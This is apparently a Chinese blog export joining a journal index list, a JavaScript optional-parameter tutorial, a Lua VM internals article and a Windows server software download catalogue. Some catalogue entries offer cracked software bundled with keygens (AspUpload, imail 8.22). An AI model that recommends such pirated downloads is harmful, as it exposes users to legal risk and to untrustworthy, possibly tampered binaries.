Railway SocietyRenewed (保持收录)04545648-硅酸盐学报Journal of the Chinese Ceramic SocietyRenewed (保持收录)10004343-中国稀土学报Journal of the Chinese Rare Earth SocietyNew (新收录)10010548-电子科技大学学报Journal of the University of Electronic Science and Technology of ChinaRenewed (保持收录)100321691993033X-Journal of Thermal ScienceRenewed (保持收录)04932137-天津大学学报Journal of Tianjin University Science and TechnologyRenewed (保持收录)0253374X-同济大学学报 （自然科学版）Journal of Tongji UniversityRenewed (保持收录)16711637-交通运输工程学报Journal of Traffic and Transportation EngineeringRenewed (保持收录)20957564--Journal of Traffic and Transportation Engineering (English Edition)Renewed (保持收录)10096744-交通运输系统工程与信息Journal of Transportation Systems Engineering and Information TechnologyRenewed (保持收录)10000054-清华大学学报Journal of Tsinghua University (Science and Technology)Renewed (保持收录)10003835-振动与冲击Journal of Vibration and ShockRenewed (保持收录)10044523-振动工程学报Journal of Vibration EngineeringRenewed (保持收录)10046801-振动测试与诊断Journal of Vibration, Measurement and DiagnosisRenewed (保持收录)0253987X-西安交通大学学报Journal of Xi&#39;an Jiaotong UniversityRenewed (保持收录)10012400-西安电子科技大学学报Journal of Xidian UniversityRenewed (保持收录)1008973X-浙江大学学报 (工学版）Journal of Zhejiang University (Engineering Science)Renewed (保持收录)1673565X18621775-Journal of Zhejiang University: Science A (Applied Physics &amp; Engineering)Renewed (保持收录)1000436X-通信学报Journal on CommunicationsRenewed (保持收录)1000241319930437-Journal Wuhan University of Technology, Materials Science EditionRenewed (保持收录)2095554520477538-Light: Science &amp; ApplicationsRenewed (保持收录)1005023X-材料导报Materials ReviewRenewed (保持收录)2096648225899651-Nano Materials ScienceNew (新收录)19980124&nbsp;19980000-Nano ResearchRenewed (保持收录)2311670621505551-Nano-Micro LettersRenewed (保持收录)10000976-天然气工业Natural Gas IndustryRenewed (保持收录)10078827-新型碳材料New Carbon MaterialsRenewed (保持收录)02580926-核动力工程Nuclear Power EngineeringRenewed (保持收录)02539985-石油与天然气地质Oil and Gas GeologyRenewed (保持收录)10007210-石油地球物理勘探Oil Geophysical ProspectingRenewed (保持收录)1004924X-光学精密工程Optics and Precision EngineeringRenewed (保持收录)20964579-光电进展Opto-Electronic AdvancesNew (新收录)1673190519935013-Optoelectronics LettersRenewed (保持收录)1674200122104291-ParticuologyRenewed (保持收录)2405656124055816-PetroleumRenewed (保持收录)10000747-石油勘探与开发Petroleum Exploration and DevelopmentRenewed (保持收录)1674925121907439-Photonic Sensors&nbsp;Renewed (保持收录)1009063020586272-Plasma Science and TechnologyRenewed (保持收录)10007555-高分子材料科学与工程Polymeric Materials Science and EngineeringRenewed (保持收录)16743415-电力系统保护与控制Power System Protection and ControlNew (新收录)10003673-电网技术Power System TechnologyRenewed (保持收录)02588013-中国电机工程学报Proceedings of the Chinese Society of Electrical EngineeringRenewed (保持收录)1002185X-稀有金属材料与工程Rare Metal Materials and EngineeringRenewed (保持收录)1001052118677185-Rare MetalsRenewed (保持收录)10020446-机器人RobotRenewed (保持收录)10007598-岩土力学Rock and Soil MechanicsRenewed (保持收录)2095927320959281-Science BulletinRenewed (保持收录)1674729118691870-Science China ChemistryRenewed (保持收录)1674731318691897-Science China Earth SciencesRenewed (保持收录)1674733X18691919-Science China Information SciencesRenewed (保持收录)2095822621994501中国科学:材料科学(英文版)SCIENCE CHINA MaterialsRenewed (保持收录)167473211862281X-Science China Technological SciencesRenewed (保持收录)1674734818691927-Science China: Physics, Mechanics and AstronomyRenewed (保持收录)10017488-林业科学Scientia Silvae SinicaeRenewed (保持收录)167472592095946X中国科学 技术科学（中文）Scientia Sinica TechnologicaRenewed (保持收录)02534967-地震地质Seismology and GeologyRenewed (保持收录)10004882-中国造船Ship Building of ChinaRenewed (保持收录)10000593-光谱学与光谱分析Spectroscopy and Spectral AnalysisRenewed (保持收录)-10013660表面技术Surface TechnologyRenewed (保持收录)10006788-系统工程理论与实践System Engineering Theory and PracticeRenewed (保持收录)1001506X-系统工程与电子技术Systems Engineering and ElectronicsRenewed (保持收录)10010645-北京理工大学学报Transaction of Beijing Institute of TechnologyRenewed (保持收录)10006753-电工技术学报Transactions of China Electrotechnical SocietyRenewed (保持收录)10000909-内燃机学报Transactions of CSICE (Chinese Society for Internal Combustion Engines)Renewed (保持收录)10051120--Transactions of Nanjing University of Aeronautics and AstronauticsRenewed (保持收录)1003632622103384-Transactions of Nonferrous Metals Society of China (English Edition)Renewed (保持收录)0253360X-焊接学报Transactions of the China Welding InstitutionRenewed (保持收录)10001298-农业机械学报Transactions of the Chinese Society for&nbsp; Agricultural MachineryRenewed (保持收录)10026819-农业工程学报Transactions of the Chinese Society of Agricultural EngineeringRenewed (保持收录)1006498219958196-Transactions of Tianjin UniversityRenewed (保持收录)10040595-摩擦学学报TribologyRenewed (保持收录)1007021418787606-Tsinghua Science and TechnologyRenewed (保持收录)10046933-水资源保护Water Resources ProtectionNew (新收录)1674237024058106-Water Science and EngineeringRenewed (保持收录) 本文由http://www.ei.org.cn 整理提供，信息来源网络！","tags":""},{"title":"js函数中如何使用可选参数（包括可选回调函数）","url":"/20220615/js-han-shu-zhong-ru-he-shi-yong-ke-xuan-can-shu-bao-gua-ke-xuan-hui-diao-han-shu/","text":"转载自函数中如何使用可选参数（包括可选回调函数） - 每天一个JavaScript小知识@Js中文网 · 码农进阶题库 实例函数中第2个与第3个参数为可选参数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263function example( err, optionalA, optionalB, callback ) &#123; // 使用数组取出arguments var args = new Array(arguments.length); for(var i = 0; i &lt; args.length; ++i) &#123; args[i] = arguments[i]; &#125;; // 第一个参数为错误参数 // shift() 移除数组中第一个参数并将其返回 err = args.shift(); // 如果最后一个参数是函数，则它为回调函数 // pop() 移除数组中最后一个参数并将其返回 if (typeof args[args.length-1] === &#x27;function&#x27;) &#123; callback = args.pop(); &#125; // 如果args中仍有元素，那就是你需要的可选参数 // 你可以像这样一个一个的将其取出： if (args.length &gt; 0) optionalA = args.shift(); else optionalA = null; if (args.length &gt; 0) optionalB = args.shift(); else optionalB = null; // 像正常一样继续：检查是否有错误 if (err) &#123; return callback &amp;&amp; callback(err); &#125; // 为了教程目的，打印可选参数 console.log(&#x27;optionalA:&#x27;, optionalA); console.log(&#x27;optionalB:&#x27;, optionalB); console.log(&#x27;callback:&#x27;, callback); /* 你想做的逻辑 */&#125;// ES6语法书写更简短function example(...args) &#123; // 第一个参数为错误参数 const err = args.shift(); // 如果最后一个参数是函数，则它为回调函数 const callback = (typeof args[args.length-1] === &#x27;function&#x27;) ? args.pop() : null; // 如果args中仍有元素，那就是你需要的可选参数你可以像这样一个一个的将其取出： const optionalA = (args.length &gt; 0) ? args.shift() : null; const optionalB = (args.length &gt; 0) ? args.shift() : null; // ... 重复取更多参数 if (err &amp;&amp; callback) return callback(err); /* 你想做的逻辑 */&#125;// 使用或不适用可选参数调用实例函数example(null, &#x27;AA&#x27;);example(null, function (err) &#123; /* do something */ &#125;);example(null, &#x27;AA&#x27;, function (err) &#123;&#125;);example(null, &#x27;AAAA&#x27;, &#x27;BBBB&#x27;, function (err) &#123;&#125;); ※如何保证optionalA和optionalB是预期的值? 设计你的函数，使其在接收optionalB时optionalA为必选参数。 ※扩展阅读 关于JS的可选参数，该知道的都在这里了. 前端面试必备——eslint篇 深入浅出 ES6：不定参数和默认参数 ES6进阶深耕系列","tags":"js"},{"title":"Lua设计与实现--虚拟机篇","url":"/20220615/lua-she-ji-yu-shi-xian-xu-ni-ji-pian/","text":"转载自 Lua设计与实现–虚拟机篇 本篇文章是Lua设计与实现专栏的第三篇，主要结合了《Lua设计与实现》书中的第五章(虚拟机)，以及lua5.3源码进行一些总结，由于原书中主要是基于lua5.1进行书写的，所以可能会有跟书中列举代码不一致的地方，不过大体上是保持一致的。 同时，本文虚拟机的概念和类型划分的内容主要参考了这篇blog的，里面讲的挺详细的。 ※虚拟机基本概念 虚拟机指借助软件系统对物理机器指令执行进行的一种模拟。首先，对于物理机器的执行，主要是机器从内存中fetch指令，通过总线传输到CPU，然后进行译码、执行、结果存储等步骤。既然虚拟机是对其进行的一种模拟，那么也逃不过以下几个特点： 将源码编译成VM所能执行的字节码。 字节码格式(指令格式)，例如三元式、四元式、波兰式等。 函数调用的相关栈结构，函数的出入口和传参方式。 指令指针，类似于物理机的指令寄存器(EIP)。 虚拟CPU。 instruction dispatcher。 取指：通过IP fetch下一条指令 译码：对指令进行翻译，得到指令类型，并且解析其操作数。 执行：跳到对应逻辑块进行执行。 ※栈式虚拟机和寄存器式虚拟机 虽然虚拟机的实现都逃不过以上几步，但是以具体实现来看，又分为两大类：栈式和寄存器式。 ※栈式虚拟机 采用栈式虚拟机的语言有JVM、CPython以及.Net CLR等。 它的概念很简单，就是所有的指令执行，都是基于一个操作数栈的。你想要执行任何指令时，对不起，得先入栈，然后算完了再给我出栈。流程如下图： 总的来说，就是抽象出了一个高度可移植的操作数栈，所有代码都会被编译成字节码，然后字节码就是在玩这个栈。 好处是实现简单，移植性强。坏处是指令条数比较多，数据转移次数比较多，因为每一次入栈出栈都牵涉数据的转移。 ※寄存器式虚拟机 采用寄存器式的虚拟机有lua和Dalvik等。 这种实现没有操作数栈这一概念，但是会有许多的虚拟寄存器。这类虚拟寄存器有别于CPU的寄存器，因为CPU寄存器往往是定址的(比如DX本身就是能存东西)，而寄存器式的虚拟机中的寄存器通常有两层含义：(1)寄存器别名(比如lua里的RA、RB、RC、RBx等)，它们往往只是起到一个地址映射的功能，它会根据指令中跟操作数相关的字段计算出操作数实际的内存地址，从而取出操作数进行计算；(2)实际寄存器，有点类似操作数栈，也是一个全局的运行时栈，只不过这个栈是跟函数走的，一个函数对应一个栈帧，栈帧里每个slot就是一个寄存器，第1步中通过别名映射后的地址就是每个slot的地址。具体的栈帧可以参考后文讲CallInfo时的栈帧图。 好处是指令条数少，数据转移次数少。坏处是单挑指令长度较长。 具体来看，lua里的实际寄存器数组是用TValue结构的栈来模拟的，这个栈也是lua和C进行交互的虚拟栈。 lua里的字节码叫做opcode，本文正文将对&quot;源码-&gt;字节码生成-&gt;字节码执行&quot;这整个流程进行介绍，并对其中的关键函数和数据结构进行源码级别的剖析。 ※关键函数和结构分析 luaL_dofile：包含了luaL_loadfile和lua_pcall两个步骤，分别对应了函数的解析和执行阶段。 luaL_loadfile：会调用具体的parser，对lua文件进行进行词法和语法分析，把source转化成opcode，并创建Proto结构保存该opcode和该函数的元信息。 Proto结构如下： 该结构基本涵盖了parse阶段该函数的所有分析信息。主要包括以下几部分： 常量表。比如在函数里写了a = 1 + 2，那这里的1和2就会放在常量表里。 局部变量信息。包含了局部变量的名字和它在函数中的生存周期区间(用pc来衡量)。 Upvalue信息。包含了该upvalue的名字和它是否归属于本函数栈还是外层函数栈的标记。 opcode列表。包含了该函数实际调用的所有指令。其实就是一个int32类型的列表，因为lua虚拟机里每个指令对应一个int32. lua_pcall：这个函数最终会调到luaD_call，也就是lua虚拟机里函数执行的主要函数。 从代码里可以看出，luaD_call的调用分为两步： luaD_precall： 如果是C函数或者C闭包，会直接创建单个函数调用的运行时结构CallInfo，来完成函数的进栈和出栈。 如果是lua闭包，在precall中只会做函数调用前的准备工作，实际执行会在后一步luaV_execute中进行。这里的准备工作主要包括：(1)处理lua的不定长参数、参数数量不够时的nil填充等。(2)分配CallInfo结构，并填充该函数运行时所需的base、top、opcode等信息，注意CallInfo结构里还有个很关键的func字段，它指向栈里对应的LClosure结构，这个结构为虚拟机后续执行提供upvalue表和常量表的查询，毕竟后续对常量和upvalue的read操作，都是需要把它们从这两个表中加载到寄存器里的。 luaV_execute：这一步就是我们前面提到的lua虚拟机的CPU了，因为所有指令的实际执行都是在这个函数里完成的。它做的主要工作，就是在一个大循环里，不断的fetch和dispatch指令。每次的fetch就是把pc加1，而dispatch就是一个大的swtich-case，每个不同类型的opcode对应不同的执行逻辑。举一个创建table的例子： 在该指令中，会首先对32位指令进行位操作，得到该table的初始数组和hash表部分的大小b和c，然后调用luaH_new来创建table，最后根据b和c的值，对table进行resize操作。 另外，前面提到的CallInfo结构，包含了单个函数调用，lua虚拟机所需要的辅助数据结构，它的结构如下： 下图是lua虚拟机在执行第二个函数时的一个栈示意图： 我们来看下lua_State里与之相关的几个字段： stack。TValue*类型，记录了&quot;内存&quot;起始地址。 base。TValue*类型，记录当前函数的第一个参数位置。 top。TValue*类型，记录当前函数的栈顶。 base_ci。当前栈里所有的函数调用CallInfo数组。 ci。当前函数的CallInfo。 可以发现，通过这样的组织结构，luavm可以方便的获取到任意函数的位置以及其中的所有参数位置。而每个CallInfo里又记录了函数的执行pc，因此vm对函数的执行可以说是了如指掌了。 ※指令格式 前文已经提到，lua虚拟机的单条指令长度为32位。其位分布如下图所示： 这里的OpCode，就是指令的类型，由于其只有6位，所有lua最多支持63种指令类型。而对于A、B、C、Bx、sBx等，都是该指令的参数，参数的值通常指的是一个相对偏移，例如相对于当前函数base的偏移，相对于常量表头的偏移等。另外，根据指令的不同，参数个数和类型也可能不同。来看几个常用的例子： 从变量赋值： ![](data:image/svg+xml;utf8,) 其实就是简单的把寄存器RB(i)的值赋值到寄存器RA(i)中去，这里的寄存器指的就是我们栈里头的某个坑位。 所以这里的RA和RB宏，都是一个栈地址获取操作，全部的定义如下： 这些宏的内部实现主要分为2步： 通过GETARG_XXX(i)从当前指令中获取参数XXX的值 用函数base或者常量表base去加这个参数值得到最终的栈(寄存器)地址。 从常量赋值： ![](data:image/svg+xml;utf8,) 与变量赋值唯一的不同，就是RB是基于常量表的偏移。 设置table字段： ![](data:image/svg+xml;utf8,) 这里不上代码了，这里RK是一个条件宏，因为我有可能是t[a] = b, 也可能是t1 = b，key如果是变量a，说明a肯定是在函数栈里头的变量，对应的寻址就用RB，而如果key是1，说明它不存在函数栈里头，而是在函数常量表里头，寻址就用KB。 ※简单例子 我们结合一个简单的lua chunk，decompile一下它生成的byte code(这里decode使用的也是书中介绍的ChunkSpy工具，目前已支持了5.3)，从而加深理解： ![](data:image/svg+xml;utf8,) 我们先来看下该chunk对应的函数，在生成的字节码里，称之为level 1 function： 一个函数最终的字节码，基本就包含三块： 常量表 upvalue表 code。所有的字节指令，都是在玩常量表、upvalue表和寄存器栈。可以结合具体的指令来理解。 我们再来看下定义在chunk里的testFunc函数，它被称为level 2函数，如果我在testFunc里还嵌套了子函数，称为level 3函数，以此类推。该函数的字节码与level 1的格式基本一致，这里就直接上图，不逐行解释了： ※总结 ※虚拟机执行流程图 在梳理完整个lua虚拟机的源码分析，opcode的生成和执行逻辑以后，我们可以上书中的一个总流程图来回顾一下： 这个图中最核心的两块，一个是Proto结构，它是分析阶段和执行阶段的桥梁；另一个是OpCode的执行，这一块可以结合前面虚拟机概念，以及Stack-based和Register-based VM的区别一起理解，包括但不限于：从CallInfo里fetch指令，指令执行时的switch case跳转和操作数的寻址，运行时的栈帧布局，lua_State中的关键字段等等。 本文的总结就到这里，后面有时间可能会啃一啃书中第六章“指令的解析与执行”，因为这两章其实联系比较紧密，到时候如果有新的收获也会同步到这边来。 本文转自 https://zhuanlan.zhihu.com/p/61888678，如有侵权，请联系删除。","tags":"lua"},{"title":"服务器安全常用软件","url":"/20220614/fu-wu-qi-an-quan-chang-yong-ruan-jian/","text":"转载自 https://s.jb51.net/ &gt;&gt;web环境安装包 序 名称 简介 适用 下载 1 BET v1.02 全能环境自动化套件… BET WEB服务器云市场整合版,支持在线更新，服务系统云部署。插件云部署。模板云部署。源码云部署… Windows 下载地址 2 phpnow V1.5.6 Win32 下绿色免费的 Apache + PHP + MySQL 环境套件包。 简易安装、快速搭建支持虚拟主机的 PHP 环境… Windows 下载地址 &gt;&gt; 服务器调试环境 序 名称 简介 适用 下载 1 Apache v2.0.63 for windows… 最流行的HTTP服务器软件之一。快速、可靠、可通过简单的API扩展，Perl/Python解释器可被编译到服务器中，完全免费，完全源代码开放… Windows 下载地址 2 Apache v2.2.14 for windows … Apache是最流行的HTTP服务器软件之一，快速、可靠、可通过简单的API扩展，Perl/Python解释器可被编译到服务器中，完全免费，完全源代码开放… Windows 下载地址 3 IIS 7.0 官方安装版… IIS(Internet信息服务管理器) IIS v6.0 sp2(不需要使用光盘)… Windows 下载地址 4 IIS(Internet信息服务管理器) IIS v6.0 sp2… IIS6完整安装 for win2003 sp2 ，满足了重新卸载安装iis的朋友… win2003 下载地址 5 IIS v6.0(不需要使用光盘)… IIS(Internet信息服务管理器) IIS6(不需要使用光盘)迅雷下载，有时候iis6没装好，或需要重装，服务器不可能给你弄个光驱的，所有用这个方便… Windows 下载地址 6 IIS v5.0(适用win2000)… IIS(Internet信息服务管理器) IIS v5.0(适用win2000) ,不过现在用win2000做服务器的不太多了，建议用win2003,安全和效率都有很大提高… win2003 下载地址 7 IIS v5.1(适用XP 本地电脑测试)… WEB服务器IIS便携安装包 适用于Windows XP系统，IIS版本为5.1版。… winxp 下载地址 8 .NET Framework v2.0… .NET Framework v2.0 多国语言版(.NET环境安装) ,iis支持asp.net2.0必备，现在好多c#开发的软件，也需要此程序。 Windows 下载地址 9 .NET Framework v3.5 简体中文版(.NET环境安装) Microsoft .NET Framework 3.5 包含许多与 .NET Framework 2.0 和 .NET Framework 3.0 都可兼容的新功能… Windows 下载地址 10 Microsoft .NET Framework v4.0 简体中文官方正式版… .NET Framework 4 将与旧的 Framework 版本并行工作。 默认情况下，基于早期版本的 Framework 的应用程序将继续在目标版本上运行。… Windows 下载地址 11 .NET删除清理工具(将电脑还原到未安装.NET框架时的状态)… Asp.net清除工具.NET Framework Setup Cleanup Utility 在安装或删除.NET Framework总是出错的，那请用这个工具，它可以轻松删除Asp.net1.1 Asp.net2.0 Asp.net 3.5等所有版本。… Windows 下载地址 12 PHP v5.2.17 for windows… PHP v5.2.17 for windows ,一般在win2003 iis6 isapi方式安装的，PHP v5.2.17修复之前版本的漏洞。强烈建议安装此版本… ( php.ini 5.2.17 参考配置 ) Windows 下载地址 13 PHP 5.2.17 Non Thead Safe fastcgi版… PHP v5.2.17是php5.2版本下的比较稳定的版本。修复的以前的很多漏洞。如果是配置服务器运行环境也建议使用护卫神出的一键安装包… Windows 下载地址 14 PHP v5.36 for windows… php5.3的最终版本，用来让iis支持php5的东西，如果不会安装可以参考本站的一些资料… Windows 下载地址 15 护卫神PHP套件 5.2.17 ISAPI版 … 护卫神·PHP套件是PHP+MySQL+Zend+PhpMyadmin的一键安装包，省去传统安装的麻烦，系统全部采用的是比较稳定的组件版本，完全不用担心日后频繁问题的出现… Windows 下载地址 16 护卫神·PHP套件 5.3.28版… 护卫神·PHP套件是PHP+MySQL+Zend+PhpMyadmin的一键安装包，省去传统安装的麻烦，系统全部采用的是比较稳定的组件版本，完全不用担心日后频繁问题的出现… Windows 下载地址 17 护卫神 PHP套件 PHP5.4.31版… 护卫神PHP套件是一个自动安装配置PHP+MySQL+PhpMyAdmin等Web环境的软件，适用于Windows2003/win2008+IIS，完全免费。… Windows 下载地址 18 护卫神 PHP套件 5.5.7版… 护卫神·PHP套件 是一款自动安装PHP+MySQL+Zend+PhpMyadmin的免费软件；让您无须任何技术，也能轻松在Windows服务器上配置PHP环境。… Win2008 64bit 下载地址 19 PHP v4.4.8 for windows(广泛用于虚拟主机)… iis支持php4的东西，一般主要是老的服务器经常用的，但如果你想体验php的更多功能，建议安装php5… Windows 下载地址 20 星外PHP5.2.17自动配置安装包 快捷配置iis php运行环境 适合新手朋友使用… 星外PHP5.2.17自动安装包(非星外系统也可以安装) ,比较快速，对于没有对iis配置过php环境的朋友使用，这个版本是安装在c盘的，其实自己安装也是不错的，一般安装在d盘等非系统安装盘… Windows 下载地址 21 星外PHP5.2.17 FastCGI自动安装包(2011-7-6更新,Windows 2008R2专用)… 星外PHP5.2.17 FastCGI自动安装包(2011-7-6更新,Windows 2008R2专用),使用win2008的朋友可以使用。… Windows 下载地址 22 ZkeysPhp自动安装php环境安装包… 本安装程序绿色环保,不写系统文件，比较方便新手配置php运行环境… Windows 下载地址 23 phpstudy win2003 apache+php+zend经典版… phpStudy php5.2珍藏版 (apache 2.2.25+php 5.2.17) (大小11M) ,解压即可运行，很方便控制，可以增加虚拟主机示例… Windows 下载地址 24 Zend Optimizer v3.33 for windows(运行Zend环境必备)… 一般用来提升php的运行效率和对于php zend加密后的代码，进行解析的东西，支持php的服务器必须要安装的… Windows 下载地址 25 eaccelerator下载(PHP 预编译加速)… php加速、优化和动态内容缓存的扩展模块，它可以提升php程序的缓存性能降低php程序在解析时对服务器性能开销… Windows 下载地址 26 Microsoft WebMatrix v1.01 简体中文版(微软最新的 Web 开发工具)… WebMatrix 是微软最新的 Web 开发工具，它包含了构建网站所需要的一切元素。您可以从开源 Web 项目或者内置的 Web 模板开始，也可以直接从无到有编写代码。简单并且完全是免费的… Windows 下载地址 &gt;&gt; 常用组件 序 名称 简介 适用 下载 1 IIS Rewrite IIS伪静态组件绿色免费版… iis下常用的组件，一般的伪静态防盗链都可以用到，是windows服务器必备工具… Windows 下载地址 2 iis 伪静态 ISAPI_Rewrite_full v2.9 完整注册版(带注册码非破解版)… ISAPI_Rewrite是一个强大的基于正则表达式的URL处理引擎。经过过滤的url更符合友好url规则，更加容易被搜索引擎所接受，是一种SEO优化有力的方法。… Windows 下载地址 3 iis 伪静态 ISAPI_Rewrite_full v3.0 完整注册版(带注册码非破解版)… ISAPIRewrite是外国开发的静态化组件，有部分虚拟主机用户会需要用到它，ISAPIRewrite分开Lite版本及FULL版本… Windows 下载地址 4 IIS 防火墙(防盗链)免费版 推荐… 基于IIS免费的防盗链软件，因为是免费的而且使用也比较简单，所以好多idc商也使用这个软件，推荐使用… Windows 下载地址 5 IIS 域名绑定子目录系统 无限子目录不用多开网站… 本软件是标准的IIS筛选器，用来完成将域名的访问指向到不同子目录的功能。… Windows 下载地址 6 win2003下让IIS6启用GZIP压缩的脚本(bat+vbs实现)… IIS6默认情况下没有开启GZIP功能，需要我们手动配置，但他又没提供图形化配置功能，一步一步配置挺麻烦的，所以从网上找了这个脚本… win2003 下载地址 7 asp 上传 AspUpload v3.0.0.6附注册机(上传组件)… asp上传组件能够实现以下功能：a.限制上载文件的大小、b.设置用户的权限、c.修改文件属性… Windows 下载地址 8 AspEMail v5.0.0.4 特别版(ASP发信组件)… asp下用来发送email的组件，应用的比较广泛，如果你的服务器需要用asp发邮件等，需要安装… Windows 下载地址 9 Jmail Pro v4.4 特别版(ASP发信组件)… 使asp支持在线发送邮件的组件，也是一款比较经常用到的组件，需要请安装… Windows 下载地址 10 AspJpeg v1.8 特别版(ASP图片水印组件)… asp下最常用到的用来给图片添加水印，制作素略图的组件，如果需要用asp来添加水印，一般的cms都支持，如果你的服务器支持asp,建议安装… Windows 下载地址 11 GD v2.0.34(PHP图片组件)… 一般用我们提供的php默认是支持gd2的，如果不支持，你可以下载这个，根据提示安装就可… Windows 下载地址 12 Microsoft Visual C++ 2005 SP1运行库(vcredist_x86.exe)简体中文官方版… Microsoft Visual C++ 2005 SP1 Redistributable Package (x86) 安装在未安装 Visual C++ 2005 的计算机上运行使用 Visual C++ 开发的应用程序所需的 Visual C++ 库的运行时组件… Windows 下载地址 13 Microsoft Visual C++ 2008 SP1运行库官方版… Visual C++ 2008 SP1运行库(VC2008运行库)软件包安装C运行时(CRT)、标准 C++、ATL、MFC、OpenMP 和 MSDIA 库的运行时组件。… Windows 32位下载 64位下载 14 Microsoft Visual C++ 2010 运行库 官方版… (VC2010运行库下载)Microsoft Visual C++ 2010 Redistributable Package (x86) 安装 Visual C++ 2010 库的运行时组件,使用户能够在未安装 Visual C++ 2010的计算机上运行使用 Visual C++ 2010 开发的应用程序… Windows 32位下载 64位下载 15 VC++运行库合集(VC RedistInstaller) v1.6.0 汇集VC2005、VC2008、VC2010、VC2012、VC2013运行库，包含32及64位版本，安装自动判断。 Windows 下载地址 16 asp 连接mysql驱动myodbc 3.51… asp 等非php语言，连接mysql 数据库的组件，安装下就可以了… Windows 下载地址 17 FastCGI 1.5 for IIS6 (win2003)… FastCGI 1.5 for IIS6，fastcgi.dll本身不具备解析脚本的能力他的作用是调度php的解析程序处理PHP。本站提供FastCGI下载，内含32位和64位两个版本。… Windows 下载地址 18 wincache v1.1/1.3 for php5.2/5.3/5.4/5.5 加速器 官方最新版 (win2003)… 微软新推出了配合FastCGI模式使用的WinCache扩展，这是一个可以显著增加PHP应用在Windows环境下使用速度的PHP加速器。… Windows 下载地址 19 微软PHP Manager v1.2 for IIS 7 (IIS7/IIS7.5下轻松配置PHP利器)… IIS7/IIS7.5下轻松配置PHP利器（微软PHP Manager for IIS 7） 方便使用iis7与iis7.5的朋友。… Windows 下载地址 &gt;&gt; 数据库服务器 序 名称 简介 适用 下载 1 SQL Server 2000 简体中文企业版①… Microsoft SQL Server 2000是一个关系数据库管理系统。SQL语言的主要功能就是同各种数据库建立联系，进行沟通… Windows 下载地址 2 SQL Server 2000 SP4 简体中文版②… SQL Server 2000 Service Pack (SP4) 可解决自从 SQL Server 2000 推出以来所发现的特定问题。… Windows 下载地址 3 SQL Server 2000 SP4+ 简体中文版③… 修正了微软的一个很严重的安全漏洞 Windows 官方下载 下载地址 4 “SQL 2000 安装提示挂起”的解决办法… 小文件解决大烦恼 Windows 下载地址 5 剑儿SQL_Server内存释放器… 由于Sql Server对于系统内存的管理策略是有多少占多少，除非系统内存不够用了（大约到剩余内存为4M左右），Sql Server才会释放一点点内存… Windows 下载地址 6 SqlServer 日志清除专家… 一款小巧方便的SqlServer日志清除工具,可用于SQL Server 7、SQL Server 2000、SQL Server 2005的各种版本的数据库日志的清除，自动检测sql server内存占用冰释放… Windows 下载地址 7 SQL Server 2005 简体中文企业版 最近从脚本之家下载sql2005的部分朋友反应无法安装sql2005，今天在安装SQL Server2005时碰到了这个错误，到网上搜了一下，找到了解决办法… Windows 下载地址 8 SQL Server 2005 SP2 简体中文版 微软SQL Server 2005 SP2加入数据库镜像功能，为SQL Server 2005 Express Edition提供新管理工具，并且加强了SAP NetWeaver智能商务系统的报告反馈支持功能… Windows 下载地址 9 SQL Server 2005 SP3 简体中文版 Microsoft SQL Server 2005 Service Pack 3 (SP3) 包含 SQL Server 2005 的所有累积更新，还包含通过我们的客户反馈平台报告的问题的修补程序。… Windows 下载地址 10 SQL Server 2005 SP4 简体中文版 SQL Server 2005 SP4包含之前的所有累积更新，修复了多个Bug问题。此服务包可以用来升级企业版、企业评估版、开发者版本、标准版本、Workgroup版… Windows 下载地址 11 SQL Server 2008 正式版 SQL Server 2008是一个重大的产品版本，它推出了许多新的特性和关键的改进，使得它成为至今为止的最强大和最全面的SQL Server版本… Windows 下载地址 12 MySQL v4.1.22 for windows 解压安装版(配合php4最稳定) 一个多线程的，结构化查询语言(SQL)数据库服务器，MySQL 的执行性能非常高，运行速度非常快，并非常容易使用，是一个非常捧的数据库… Windows 下载地址 13 MySQL v5.0.96 for windows 32位 解压安装版(配合php5最佳) 一般情况下，到官方去看最新的版本稍微好点。 Windows 下载地址 14 MySQL v5.0.96 for windows 64位 解压安装版(配合php5最佳) 一般情况下，到官方去看最新的版本稍微好点。 Windows 下载地址 15 MySQL数据库 v5.1.73 Final 一般情况下，到官方去看最新的版本稍微好点。 Windows 32位下载 64位下载 16 MySQL Server v5.5.45 一般情况下，到官方去看最新的版本稍微好点。 Windows 32位下载 64位下载 17 MySQL Server v5.6.26 一般情况下，到官方去看最新的版本稍微好点。 Windows 32位下载 64位下载 18 MySQL 密码重置工具bat 直接运行bat文件就可以修改mysql的root密码了。 Windows 下载地址 &gt;&gt; FTP服务器 序 名称 简介 适用 下载 1 Serv-U FTP Server v8.0.0.7 多国语言特别版 Serv-U是一款由Rob Beckers开发的获奖的FTP服务器软件，它功能强大又易于使用，Serv-U FTP Server v8.0.0.7 多国语言特别版界面变化很大… Windows 下载地址 2 Serv-U FTP Server v7.2.0.1 多国语言特别版 非常好的FTP服务器软件，它设置简单，功能强大，性能稳定。erv-U FTP Server v7.2.0.1 多国语言特别版界面变化很大… Windows 下载地址 3 Serv-U FTP Server v6.4.0.6 汉化特别版 一种被广泛运用的FTP服务器端软件，设置简单，功能强大，性能稳定… Windows 下载地址 4 Serv-U FTP Server v6.4.0.6 汉化绿色特别版 serv-u绿色版，可先备份你原来的站点文件，适合升级使用… Windows 下载地址 5 FTP服务器 FileZilla Server V0.9.41 绿色汉化版 小巧的FTP服务器软件，若你想玩玩简单的FTP服务器，那你可以试试这个耗用系统资源相当小的软件，让你轻松又容易架设一个FTP服务器。 Windows 下载地址 6 Xlight FTP Server 简单易用的FTP服务器 Xlight支持SSL加密和ODBC数据库，服务器运行时占用很少的CPU和内存资源. 用它独创的高效网络算法，它能够比其他Windows FTP服务器处理更多的用户… Windows 下载地址 7 Gene6 FTP Server Professional v3.10.0.2 多语言特别版 Gene6 FTP Server Professional v3.10.0.2 多语言特别版(集成了中文),是一个基于Windows操作系统开发的，安全高效的高级FTP服务器软件… Windows 下载地址 &gt;&gt; 邮件服务器 序 名称 简介 适用 下载 1 WinWebMail(WebEasyMail) v3.7.6.1 企业版 适合建立小型邮件服务器，安全高速的全功能邮件服务器，融合强大的功能与轻松的管理为一体，提供最佳的企业级邮件服务器解决方案，企业版本支持邮件防病毒。 Windows 下载地址 2 imail 8.22中文破解服务器版 imail 8.22中文破解服务器版内附中文模板+注册机，安全高速的全功能邮件服务器，融合强大的功能与轻松的管理为一体… Windows 下载地址 3 WinWebmail 邮件服务器 v3.8.1.3 WinWebmail 邮件服务器 v3.8.1.3 (win2008建议用)是安全高速的全功能邮件服务器，融合强大的功能与轻松的管理为一体… Windows 下载地址 &gt;&gt; 代理服务器 序 名称 简介 适用 下载 1 CCProxy v6.6(中文代理服务器) 